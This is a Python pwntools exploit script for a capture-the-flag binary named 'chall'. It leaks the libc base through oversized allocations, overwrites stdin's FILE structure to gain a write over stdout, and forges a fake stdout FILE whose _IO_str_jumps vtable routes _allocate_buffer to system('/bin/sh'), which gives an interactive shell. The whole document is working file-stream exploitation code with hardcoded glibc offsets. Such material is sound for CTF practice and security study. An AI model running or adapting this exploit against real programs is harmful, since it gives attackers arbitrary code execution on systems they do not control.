#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./chall')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# gdb.attach(p, 'b *$rebase(0xAA9)\n')

# 👶 < Hi.
# 1.🧾 / 2.✏️ / 3.🗑️ / 4.👀
# > ^C

def add(size, Len, payload, _next=False):
  if not _next:
    p.sendlineafter('>', '1')
    p.sendlineafter('alloc size:', str(size))
    p.sendlineafter('read size:', str(Len))
    p.sendlineafter('data:', payload)
  else :
    p.sendline("1")
    p.sendline(str(size))
    p.sendline(str(Len))
    p.sendline(payload)

if __name__ == "__main__":
  # leak libc
  add(0x200000, 0x5ed761, 'Mech0n')
  add(0x200000, 0x7ee771, 'Mech0n', True)
  LIBC = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3ed8b0
  success('LEAK: ' + str(hex(LIBC)))
  
  libc.address = LIBC
  stdin = libc.sym['_IO_2_1_stdin_']
  stdout = libc.sym['_IO_2_1_stdout_']
  bin_sh = LIBC + 0x1b3e9a
  stdfile_lock = LIBC + 0x3ed8c0
  wide_data = LIBC + 0x3eb8c0
  io_str_jumps = LIBC + 0x3e8360
  system = libc.sym['system']


  add(0x200000, 0x9eea29, 'Mech0n')

  payload  = p64(0xfbad208b) # _flags as they were before
  payload += p64(stdin) # _IO_read_ptr (needs to be a valid pointer)
  payload += p64(0) * 5 # _IO_read_end to _IO_write_end can all be 0
  payload += p64(stdout) # _IO_buf_base, we are overwriting stdout
  payload += p64(stdout + 0x2000) # _IO_buf_end, we can overwrite 0x2000 bytes
  payload = payload.ljust(0x84, b"\x00") # 0x84 byte padding to get to the next `fgets`
  p.send(payload)

  fake_file  = p64(0xfbad2886) # original _flags & ~_IO_USER_BUF
  fake_file += p64(stdout) * 4 # _IO_read_ptr to _IO_write_base
  fake_file += p64((bin_sh - 100) // 2) # _IO_write_ptr
  fake_file += p64(0) * 2 # _IO_write_end and _IO_buf_base
  fake_file += p64((bin_sh - 100) // 2) # _IO_buf_end
  fake_file += p64(0) * 4 # _IO_save_base to _markers
  fake_file += p64(stdin) # _chain
  fake_file += p32(1) # _fileno
  fake_file += p32(0) # _flags2
  fake_file += p64(0xffffffffffffffff) # _old_offset
  fake_file += p16(0) # _cur_column
  fake_file += p8(0) # _vtable_offset
  fake_file += b'\n' # _shortbuf
  fake_file += p32(0) # padding between shortbuf and _lock
  fake_file += p64(stdfile_lock) # _lock
  fake_file += p64(0xffffffffffffffff) # _offset
  fake_file += p64(0) # _codecvt
  fake_file += p64(wide_data) # _wide_data
  fake_file += p64(0) # _freeres_list
  fake_file += p64(0) #_freeres_buf
  fake_file += p64(0) #__pad5
  fake_file += p32(0xffffffff) # _mode
  fake_file += b'\0'*20 # _unused2
  fake_file += p64(io_str_jumps) # vtable
  fake_file += p64(system) # _s._allocate_buffer
  fake_file += p64(stdout) # _s._free_buffer

  p.sendlineafter('>', fake_file)

  # gdb.attach(p)
  p.interactive()